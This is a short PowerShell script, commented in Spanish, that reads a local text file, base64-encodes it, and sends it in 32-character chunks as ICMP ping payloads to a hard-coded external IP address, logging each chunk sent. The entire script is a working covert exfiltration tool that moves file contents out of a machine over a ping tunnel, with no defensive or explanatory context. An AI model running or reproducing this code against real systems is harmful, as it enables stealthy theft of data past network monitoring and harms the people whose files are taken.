$archivo = "C:\Users\spider\Pictures\Ofisat TTX\Readme_Service.txt"
$ip = "31.97.185.189"
$bytes = [System.IO.File]::ReadAllBytes($archivo)
$base64 = [System.Convert]::ToBase64String($bytes)

$ping = New-Object System.Net.NetworkInformation.Ping
$opciones = New-Object System.Net.NetworkInformation.PingOptions
$opciones.DontFragment = $true

Write-Host "[*] Enviando data..."
# Enviar en trozos de 32 caracteres para asegurar que quepan en el buffer ICMP
for ($i=0; $i -lt $base64.Length; $i+=32) {
    $chunk = $base64.Substring($i, [Math]::Min(32, $base64.Length - $i))
    $buf = [System.Text.Encoding]::ASCII.GetBytes($chunk)
    $ping.Send($ip, 1000, $buf, $opciones) | Out-Null
    Write-Host "Bloque enviado: $chunk"
    Start-Sleep -Milliseconds 50
}	